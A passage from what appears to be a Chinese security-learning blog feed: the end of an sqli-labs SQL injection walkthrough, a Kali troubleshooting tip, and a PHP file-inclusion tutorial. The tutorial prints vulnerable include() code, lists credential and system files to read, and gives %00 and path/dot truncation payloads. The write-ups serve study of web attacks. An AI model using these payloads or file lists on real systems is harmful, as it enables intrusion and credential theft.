title="Less-50"></a>Less-50</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注&amp;报错&amp;堆叠注入</td><td>order by $sort</td></tr></tbody></table><p>请求方式从mysqli_qury变为了mysqli_multi_query，所以多了堆叠注入</p><p>详细可看Less-38</p><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注&amp;报错&amp;堆叠注入</td><td>order by ‘$sort’</td></tr></tbody></table><p>闭合方式不同</p><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注&amp;堆叠注入</td><td>order by $sort</td></tr></tbody></table><p>没有了报错</p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注&amp;堆叠注入</td><td>order by ‘$sort’</td></tr></tbody></table><p>与上题区别在于闭合。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>哈哈，又完成了一个专题。主要是，这个专题的完成时间比第二个少多了，知识点少了不少。好，废话不多说，正式回顾。</p><p>首先，我们了解了堆叠注入：结束一个sql语句后继续构造下一条语句，这样就能构造各种各样的注入语句。而且我们的语句数量可以多个。而union只能使用一次。</p><p>但是我们必须知道，在各种网站中一般只会显示一个查询结果，所以查询数据我们还是一般使用union，堆叠注入可以用在对数据库的增删改。</p><p>我们还了解了，loadfile函数，它可以与堆叠注入结合，将查询结果发送到DNSLog中，但是只能在Windows环境下使用。</p><p>之后，我们还遇到了order by的注入，这个注入的不同之处在于无法使用union进行查询，而且根据参数的不同会导致结果的不同，所以我们一般会使用rand进行布尔盲注以及时间盲注。</p><p>此外还有procedure analyse注入，由此使用报错注入，这个报错注入一般使用在order by时，而且卡伊使用在limit之后</p><p>我们还了解了into outfilem，可以写入木马。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见问题解决</title>
      <link href="/2021/09/06/chang-jian-wen-ti-jie-jue/"/>
      <url>/2021/09/06/chang-jian-wen-ti-jie-jue/</url>
      
        <content type="html"><![CDATA[<h3 id="kali扩容"><a href="#kali扩容" class="headerlink" title="kali扩容"></a>kali扩容</h3><p><a href="https://blog.csdn.net/weixin_44119101/article/details/105017632">https://blog.csdn.net/weixin_44119101/article/details/105017632</a></p><h3 id="vmware-kali网络无法连接"><a href="#vmware-kali网络无法连接" class="headerlink" title="vmware,kali网络无法连接"></a>vmware,kali网络无法连接</h3><p><a href="https://blog.csdn.net/czg13548930186/article/details/77099074">https://blog.csdn.net/czg13548930186/article/details/77099074</a></p><p><a href="https://blog.csdn.net/chenyanhui1087/article/details/53127884">https://blog.csdn.net/chenyanhui1087/article/details/53127884</a></p><h3 id="如何在kali中以管理员权限打开VScode"><a href="#如何在kali中以管理员权限打开VScode" class="headerlink" title="如何在kali中以管理员权限打开VScode"></a>如何在kali中以管理员权限打开VScode</h3><p>sudo code /directory-to-open –user-data-dir=’.’ –no-sandbox</p>]]></content>
      
      
      <categories>
          
          <category> vmware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2021/09/05/wen-jian-bao-han-lou-dong/"/>
      <url>/2021/09/05/wen-jian-bao-han-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  本文章的文章包含漏洞目前仅限于PHP语言，其他语言再今后的学习中也会逐渐研究。</p><p>  <img src="1.png"></p><h2 id="文件包含文件简介"><a href="#文件包含文件简介" class="headerlink" title="文件包含文件简介"></a>文件包含文件简介</h2><p>  服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><p>  PHP文件包含函数有以下四种</p>  <pre class="line-numbers language-文件函数" data-language="文件函数"><code class="language-文件函数">require()require_once()include()include_once()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。(也就是说，如果include中有多个语句，如果其中一个预计出现错误后，也会继续运行后面的语句)</p><p>  而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><h3 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h3><p>  文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>  示例代码</p>  <pre class="line-numbers language-none"><code class="language-none">&lt;?php    $filename  &#x3D; $_GET[&#39;filename&#39;];    include($filename);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>  例如：</p><p>  $_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET[‘filename’]的值，执行非预期的操作。</p><h2 id="本地包含漏洞"><a href="#本地包含漏洞" class="headerlink" title="本地包含漏洞"></a>本地包含漏洞</h2><p>本地包含漏洞只能查看或运行本地文件。</p><h3 id="无限制"><a href="#无限制" class="headerlink" title="无限制"></a>无限制</h3><p>测试代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过目录遍历漏洞可以获取到系统中其他文件的内容：</p><h4 id="常见的敏感信息路径："><a href="#常见的敏感信息路径：" class="headerlink" title="常见的敏感信息路径："></a>常见的敏感信息路径：</h4><p>Windows系统</p><pre class="line-numbers language-none"><code class="language-none">c:\boot.ini &#x2F;&#x2F; 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码c:\windows\php.ini &#x2F;&#x2F; php 配置信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Linux/Unix系统</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>知道session的保存地址。</p><ol><li>我们可以通过phpinfo();获取其地址。</li></ol><p><img src="2.png"></p><ol start="2"><li>进行猜测，一般Linux存储地址为/var/lib/php/session</li></ol><p>session中的内容可以被控制，传入恶意代码。</p><p>实例：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>此php会将获取到的GET型ctfs变量的值存入到session中。</p><p>当访问localhost/sessionTest.php?ctfs=Violet 后，会在/var/lib/php/session目录下存储session的值。</p><p>session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。</p><p><img src="3.png"></p><h4 id="漏洞实现"><a href="#漏洞实现" class="headerlink" title="漏洞实现"></a>漏洞实现</h4><p>简单地说，我们可以通过ctfs参数，自由写入各种语句，由此形成注入。比如，我们通过上述语句写入phpinfo语句。</p><p><img src="4.png"></p><p><img src="5.png"></p><h3 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与文件上传类似，我们可以使用%00作为截断符，使其后缀失效。</p><p><img src="6.png"></p><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p>条件：windows OS，点号需要长于256；linux OS 长于4096</p><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p><p>EXP：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">filename<span class="token operator">=</span>test<span class="token operator">.</span>txt<span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token comment">//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>条件：windows OS，点号需要长于256</p><pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><blockquote><p>allow_url_fopen = On（是否允许打开远程文件）</p></blockquote><blockquote><p>allow_url_include = On（是否允许include/require远程文件）</p></blockquote><h3 id="无限制远程文件包含漏洞"><a href="#无限制远程文件包含漏洞" class="headerlink" title="无限制远程文件包含漏洞"></a>无限制远程文件包含漏洞</h3><p>即无过滤。</p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我这里有些有些问题，之后在研究吧。</p><h2 id="PHP伪协议"><a href="#PHP伪协议" 